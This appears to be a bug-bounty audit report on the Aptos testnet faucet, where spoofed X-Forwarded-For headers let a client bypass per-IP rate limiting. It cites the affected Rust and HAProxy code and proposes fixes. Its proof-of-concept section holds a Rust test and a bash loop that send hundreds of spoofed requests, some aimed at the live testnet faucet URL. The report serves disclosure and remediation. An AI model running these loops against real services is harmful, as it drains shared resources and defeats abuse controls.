# Audit Report

## Title
Private IP Header Spoofing Bypasses Faucet Rate Limiting

## Summary
The Aptos faucet's rate limiting mechanism can be bypassed by spoofing private IP addresses in HTTP forwarding headers (`X-Forwarded-For`, `X-Real-IP`). An attacker can send requests with different spoofed private IP addresses (from ranges like 10.0.0.0/8, which contains 16 million addresses), with each IP receiving its own independent rate limit counter, effectively multiplying the attacker's request capacity by the number of unique IPs they spoof.

## Finding Description

The faucet implements per-IP rate limiting to prevent abuse, but trusts client-provided forwarding headers without proper validation. The vulnerability exists across multiple components:

**1. IP Extraction Without Validation**

The faucet extracts the source IP using Poem framework's `RealIp` extractor, which reads `X-Forwarded-For` and `X-Real-IP` headers: [1](#0-0) 

The extracted `source_ip` becomes the basis for all rate limiting decisions without any validation that the IP is genuine or checking if it's from a private range.

**2. Per-IP Rate Limiting**

The `MemoryRatelimitChecker` applies rate limits based on the extracted `source_ip`: [2](#0-1) 

Each unique IP address gets its own counter in the `ip_to_requests_today` map. There's no aggregate rate limiting for IP ranges or detection of private IPs.

**3. No Header Sanitization in Proxy Layer**

The HAProxy configuration adds forwarding headers but does not strip client-provided headers: [3](#0-2) 

This means both client-provided headers and HAProxy-added headers reach the backend, and if the application trusts the wrong header, spoofing succeeds.

**4. Similar Pattern in Other Services**

The telemetry service demonstrates the same trust-first approach, explicitly trusting the first IP from `X-Forwarded-For`: [4](#0-3) 

**Attack Flow:**

1. Attacker sends HTTP POST to `/fund` endpoint with header: `X-Forwarded-For: 10.0.0.1`
2. HAProxy (if present) adds: `Forwarded: for=<real-attacker-ip>` but doesn't strip the client header
3. Poem's `RealIp` extractor reads `X-Forwarded-For: 10.0.0.1` (precedence over HAProxy's header)
4. Rate limiter creates/increments counter for `10.0.0.1`
5. Attacker repeats with `10.0.0.2`, `10.0.0.3`, ..., `10.0.255.255`
6. Each spoofed IP gets `max_requests_per_day` requests
7. With 1000 spoofed IPs and limit of 1 request/day, attacker makes 1000 requests instead of 1

## Impact Explanation

This vulnerability falls under **Medium Severity** per Aptos bug bounty criteria because it enables:

1. **Limited Funds Loss**: An attacker can drain faucet funds significantly faster than intended rate limits allow, though not instantaneously
2. **Security Control Bypass**: The rate limiting mechanism, which is a core security control for the faucet, can be trivially bypassed
3. **Resource Exhaustion**: The faucet could be drained in hours instead of the intended days/weeks

The impact is contained to the faucet (a testnet funding service) and doesn't affect consensus, validator operations, or mainnet funds, preventing it from reaching Critical or High severity. However, it's more severe than a simple information leak, justifying Medium severity classification.

Quantified impact:
- With 10,000 spoofed private IPs and a rate limit of 1 request/day/IP, an attacker can make 10,000 requests
- The 10.0.0.0/8 private range alone provides 16,777,216 possible addresses
- Faucet could be depleted in hours if automated

## Likelihood Explanation

**Likelihood: HIGH**

The attack is highly likely to occur because:

1. **No Special Privileges Required**: Any user with HTTP client access can exploit this
2. **Trivial Execution**: Spoofing headers requires only basic HTTP knowledge:
   ```bash
   curl -X POST https://faucet.testnet.aptoslabs.com/fund \
     -H "X-Forwarded-For: 10.0.0.1" \
     -H "Content-Type: application/json" \
     -d '{"address":"0x123..."}'
   ```
3. **Easily Automated**: A simple script can iterate through thousands of IPs in minutes
4. **Wide Attack Surface**: Affects any faucet deployment that doesn't have a properly configured reverse proxy
5. **No Detection**: The current implementation has no logging or alerting for suspicious IP patterns

The only mitigating factor is if the faucet is deployed behind a properly configured reverse proxy that strips client headers, but this configuration is not enforced or documented.

## Recommendation

Implement multiple layers of defense:

**1. Strip Client-Provided Headers at Proxy Layer**

Update HAProxy configuration to strip untrusted headers before adding trusted ones:

```haproxy
## In all HTTP frontends, add before http-request add-header:
http-request del-header X-Forwarded-For
http-request del-header X-Real-IP  
http-request del-header Forwarded
http-request set-header X-Forwarded-For %[src]
```

**2. Filter Private IPs at Application Layer**

Add validation in the rate limit checker:

```rust
// In memory_ratelimit.rs check() method, after line 75:
async fn check(
    &self,
    data: CheckerData,
    dry_run: bool,
) -> Result<Vec<RejectionReason>, AptosTapError> {
    self.clear_if_new_day().await;

    // Reject private IPs
    if is_private_or_loopback(&data.source_ip) {
        return Ok(vec![RejectionReason::new(
            format!("Private IP {} is not allowed", data.source_ip),
            RejectionReasonCode::IpNotAllowed,
        )]);
    }

    let mut ip_to_requests_today = self.ip_to_requests_today.lock().await;
    // ... rest of existing code
}

fn is_private_or_loopback(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(ipv4) => {
            ipv4.is_private() || 
            ipv4.is_loopback() || 
            ipv4.is_link_local() ||
            ipv4.is_unspecified()
        },
        IpAddr::V6(ipv6) => {
            ipv6.is_loopback() || 
            ipv6.is_unspecified()
        }
    }
}
```

**3. Add Rate Limiting by Other Factors**

Implement additional rate limiting based on:
- Request fingerprinting (User-Agent, headers)
- Destination address patterns
- Captcha for suspicious patterns

**4. Add Monitoring and Alerting**

Log and alert when suspicious patterns are detected:
- Multiple requests with sequential private IPs
- High request rates from single source
- Unusual distribution of source IPs

## Proof of Concept

```rust
// File: exploit_test.rs
// This demonstrates the vulnerability

use reqwest;

#[tokio::test]
async fn test_private_ip_spoofing_bypass() {
    let faucet_url = "http://localhost:8081/fund";
    let client = reqwest::Client::new();
    
    // Normal request with real IP - gets rate limited after max_requests_per_day
    let response1 = client
        .post(faucet_url)
        .json(&serde_json::json!({
            "address": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(response1.status(), 200);
    
    // Subsequent request from same IP should be rate limited
    let response2 = client
        .post(faucet_url)
        .json(&serde_json::json!({
            "address": "0xabcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890"
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(response2.status(), 429); // Too Many Requests
    
    // But with spoofed private IPs, bypass rate limit
    for i in 1..=100 {
        let spoofed_ip = format!("10.0.0.{}", i);
        let response = client
            .post(faucet_url)
            .header("X-Forwarded-For", spoofed_ip)
            .json(&serde_json::json!({
                "address": format!("0x{:064x}", i)
            }))
            .send()
            .await
            .unwrap();
        
        // Each spoofed IP gets through because it has its own rate limit counter
        assert_eq!(response.status(), 200, 
            "Request {} with spoofed IP should succeed", i);
    }
    
    // Successfully made 101 requests (1 real + 100 spoofed) instead of 1
}
```

```bash
# Shell-based PoC
#!/bin/bash

FAUCET_URL="https://faucet.testnet.aptoslabs.com/fund"

# Make 1000 requests with different spoofed private IPs
for i in {1..1000}; do
    SPOOFED_IP="10.0.$((i/256)).$((i%256))"
    ADDRESS=$(openssl rand -hex 32)
    
    curl -X POST "$FAUCET_URL" \
        -H "X-Forwarded-For: $SPOOFED_IP" \
        -H "Content-Type: application/json" \
        -d "{\"address\":\"0x$ADDRESS\"}" \
        --silent --output /dev/null --write-out "%{http_code}\n"
    
    # All requests should return 200, bypassing rate limit
done
```

## Notes

- This vulnerability affects all faucet deployments that don't have a properly configured reverse proxy
- The same vulnerability pattern exists in `aptos-telemetry-service`, suggesting a systemic issue with header trust
- Private IP ranges provide millions of possible addresses (10.0.0.0/8 = 16,777,216 IPs, 172.16.0.0/12 = 1,048,576 IPs, 192.168.0.0/16 = 65,536 IPs)
- Even if HAProxy is present, the configuration doesn't strip client headers, only adds new ones
- The `IpAllowlistBypasser` mechanism could compound this issue if private ranges are allowlisted, allowing complete bypass of all checkers [5](#0-4)

### Citations

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L77-88)
```rust
        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }
```

**File:** docker/compose/aptos-node/haproxy-fullnode.cfg (L108-109)
```text
    ## Add the forwarded header
    http-request add-header Forwarded "for=%ci"
```

**File:** crates/aptos-telemetry-service/src/custom_event.rs (L77-80)
```rust
    let client_ip = forwarded_for
        .as_ref()
        .and_then(|xff| xff.split(',').next())
        .unwrap_or("UNKNOWN");
```

**File:** crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs (L25-28)
```rust
impl BypasserTrait for IpAllowlistBypasser {
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        Ok(self.manager.contains_ip(&data.source_ip))
    }
```
